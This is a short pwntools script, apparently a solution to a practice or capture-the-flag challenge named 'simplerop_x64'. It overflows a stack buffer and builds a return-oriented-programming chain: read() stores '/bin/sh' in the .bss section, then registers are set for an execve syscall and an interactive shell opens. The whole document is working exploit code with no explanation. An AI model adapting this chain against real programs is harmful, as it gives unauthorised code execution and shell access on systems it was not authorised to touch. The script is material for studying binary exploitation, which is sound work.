from pwn import *

sh = process("./simplerop_x64")
pwn = ELF("./simplerop_x64")
read = pwn.symbols["read"]
pop_rax_ret = 0x46b9f8
pop_rdi_ret = 0x4016c3
pop_rdx_rsi_ret = 0x4377f9
syscall = 0x400488
bss = pwn.bss()

sh.recv()
payload = 'a' * 0x58
payload += p64(pop_rdi_ret)+p64(0)+p64(pop_rdx_rsi_ret)+p64(0x100)+p64(bss)+p64(read)
payload += p64(pop_rdi_ret)+p64(bss)+p64(pop_rax_ret)+p64(0x3b)+p64(pop_rdx_rsi_ret)+p64(0)+p64(0)+p64(syscall)
sh.sendline(payload)
sh.sendline("/bin/sh\x00")
sh.interactive()
